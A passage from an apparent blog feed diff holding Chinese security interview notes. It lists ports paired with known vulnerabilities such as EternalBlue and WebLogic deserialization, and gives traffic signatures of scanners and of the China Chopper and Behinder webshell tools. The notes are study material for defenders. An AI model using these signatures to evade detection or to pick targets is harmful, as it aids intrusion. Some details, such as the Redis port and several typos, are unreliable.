+<h3 id="说一下常见的端口和漏洞"><a href="#说一下常见的端口和漏洞" class="headerlink" title="说一下常见的端口和漏洞"></a>说一下常见的端口和漏洞</h3><p>答:<br>1433 mssql<br>1521 orcale<br>3306 mysql<br>4376 Redis未授权访<br>7001 weblogic 反序列化<br>445 永恒之蓝</p>
+<h3 id="说一下常用的安全工具的流量特征"><a href="#说一下常用的安全工具的流量特征" class="headerlink" title="说一下常用的安全工具的流量特征"></a>说一下常用的安全工具的流量特征</h3><p>答:<br>awvs的在header url body 三项中都会有a%#-wvs<br>sqlmap的 会在ua显示sqlmap级版本号 和 sqlmap网址<br>appscan url header和bkdy中都会有appscan<br>然后说了下菜刀大多使用base64编码，eval和assert会被隔开</p>
+<h3 id="说一下冰蝎的流量特征"><a href="#说一下冰蝎的流量特征" class="headerlink" title="说一下冰蝎的流量特征"></a>说一下冰蝎的流量特征</h3><p>答: 这个有点不记得了<br>注:(冰蝎<br>1.content-type一定为application/octet-stream<br>2.内置17个UA Mozilla4/5<br>3.payload定长且无随机填充部分(padding)<br>)</p>
+]]></content>
+      <categories>
+        <category>面试</category>
+      </categories>
+      <tags>
+        <tag>面试</tag>
       </tags>
   </entry>
   <entry>
